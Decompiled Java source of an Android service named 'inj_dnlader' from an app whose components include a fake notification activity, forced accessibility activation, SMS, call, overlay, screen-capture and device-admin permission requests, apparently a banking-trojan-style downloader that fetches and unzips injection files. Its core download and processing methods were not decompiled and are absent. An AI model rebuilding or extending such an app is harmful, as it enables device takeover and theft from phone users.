package com.com.androidrr;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.objects.streams.File;
import anywheresoftware.b4a.sql.SQL;
import b4a.example.dateutils;
import b4a.flm.archiverplus.ArchiverPlusZip;
import java.lang.reflect.Method;

/* loaded from: classes.dex */
public class inj_dnlader extends Service {
    static inj_dnlader mostCurrent;
    public static BA processBA;
    private ServiceHelper _service;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public static void _jobdone(httpjob httpjobVar) throws Exception {
    }

    public static String _process_globals() throws Exception {
        return "";
    }

    public static String _service_destroy() throws Exception {
        return "";
    }

    public static void _sql_nonquerycomplete(boolean z) throws Exception {
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static class inj_dnlader_BR extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            BA.LogInfo("** Receiver (inj_dnlader) OnReceive **");
            Intent intent2 = new Intent(context, (Class<?>) inj_dnlader.class);
            if (intent != null) {
                intent2.putExtra("b4a_internal_intent", intent);
            }
            ServiceHelper.StarterHelper.startServiceFromReceiver(context, intent2, false, BA.class);
        }
    }

    public static Class<?> getObject() {
        return inj_dnlader.class;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
            BA BA = new BA(this, (BALayout) null, (BA) null, "com.com.androidrr", "com.com.androidrr.inj_dnlader");
            processBA = BA;
            if (BA.isShellModeRuntimeCheck(BA)) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals", new Class[0]).invoke(null, null);
                processBA.loadHtSubs(getClass());
                ServiceHelper.init();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        this._service = new ServiceHelper(this);
        processBA.service = this;
        if (BA.isShellModeRuntimeCheck(processBA)) {
            BA BA2 = processBA;
            BA2.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.inj_dnlader", BA2, this._service, Float.valueOf(Common.Density));
        }
        if (ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false)) {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (inj_dnlader) Create ***");
            processBA.raiseEvent(null, "service_create", new Object[0]);
        }
        processBA.runHook("oncreate", this, null);
    }

    @Override // android.app.Service
    public void onStart(Intent intent, int i) {
        onStartCommand(intent, 0, 0);
    }

    @Override // android.app.Service
    public int onStartCommand(final Intent intent, int i, int i2) {
        if (!ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() { // from class: com.com.androidrr.inj_dnlader.1
            @Override // java.lang.Runnable
            public void run() {
                inj_dnlader.this.handleStart(intent);
            }
        })) {
            ServiceHelper.StarterHelper.addWaitForLayout(new Runnable() { // from class: com.com.androidrr.inj_dnlader.2
                @Override // java.lang.Runnable
                public void run() {
                    inj_dnlader.processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (inj_dnlader) Create **");
                    inj_dnlader.processBA.raiseEvent(null, "service_create", new Object[0]);
                    inj_dnlader.this.handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
                }
            });
        }
        processBA.runHook("onstartcommand", this, new Object[]{intent, Integer.valueOf(i), Integer.valueOf(i2)});
        return 2;
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void handleStart(Intent intent) {
        BA.LogInfo("** Service (inj_dnlader) Start **");
        Method method = processBA.htSubs.get("service_start");
        if (method != null) {
            if (method.getParameterTypes().length > 0) {
                processBA.raiseEvent(null, "service_start", ServiceHelper.StarterHelper.handleStartIntent(intent, this._service, processBA));
            } else {
                processBA.raiseEvent(null, "service_start", new Object[0]);
            }
        }
    }

    @Override // android.app.Service
    public void onTimeout(int i) {
        BA.LogInfo("** Service (inj_dnlader) Timeout **");
        Map map = new Map();
        map.Initialize();
        map.Put("StartId", Integer.valueOf(i));
        processBA.raiseEvent(null, "service_timeout", map);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        BA.LogInfo("** Service (inj_dnlader) Destroy **");
        processBA.raiseEvent(null, "service_destroy", new Object[0]);
        processBA.service = null;
        mostCurrent = null;
        processBA.setActivityPaused(true);
        processBA.runHook("ondestroy", this, null);
    }

    public static String _ar_zipresult(int i, String str) throws Exception {
        try {
            Common.LogImpl("620447234", "ar", 0);
            _start_op();
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("620447237", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _service_create() throws Exception {
        Common.LogImpl("620119553", "----------------------", 0);
        Common.LogImpl("620119554", "inj created ", 0);
        return "";
    }

    public static String _service_start(IntentWrapper intentWrapper) throws Exception {
        mostCurrent._service.StopAutomaticForeground();
        _start_sy();
        return "";
    }

    public static void _start_op() throws Exception {
        new ResumableSub_start_op(null).resume(processBA, null);
    }

    public static class ResumableSub_start_op extends BA.ResumableSub {
        int limit14;
        inj_dnlader parent;
        int step14;
        SQL _sql = null;
        List _lst = null;

        /* renamed from: _i */
        int f349_i = 0;
        Object _senderfilter = null;
        boolean _success = false;

        public ResumableSub_start_op(inj_dnlader inj_dnladerVar) {
            this.parent = inj_dnladerVar;
        }

        /* JADX WARN: Removed duplicated region for block: B:120:0x0255  */
        /* JADX WARN: Removed duplicated region for block: B:122:0x0261 A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r17, java.lang.Object[] r18) throws java.lang.Exception {
            /*
                Method dump skipped, instructions count: 686
                To view this dump change 'Code comments level' option to 'DEBUG'
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.inj_dnlader.ResumableSub_start_op.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public static void _start_sy() throws Exception {
        new ResumableSub_start_sy(null).resume(processBA, null);
    }

    public static class ResumableSub_start_sy extends BA.ResumableSub {
        inj_dnlader parent;

        /* renamed from: _j */
        httpjob f350_j = null;
        File.OutputStreamWrapper _outstream = null;
        String _strfilename = "";
        ArchiverPlusZip _ar = null;

        public ResumableSub_start_sy(inj_dnlader inj_dnladerVar) {
            this.parent = inj_dnladerVar;
        }

        /* JADX WARN: Removed duplicated region for block: B:112:0x0238  */
        /* JADX WARN: Removed duplicated region for block: B:114:0x0244 A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r17, java.lang.Object[] r18) throws java.lang.Exception {
            /*
                Method dump skipped, instructions count: 664
                To view this dump change 'Code comments level' option to 'DEBUG'
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.inj_dnlader.ResumableSub_start_sy.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }
}
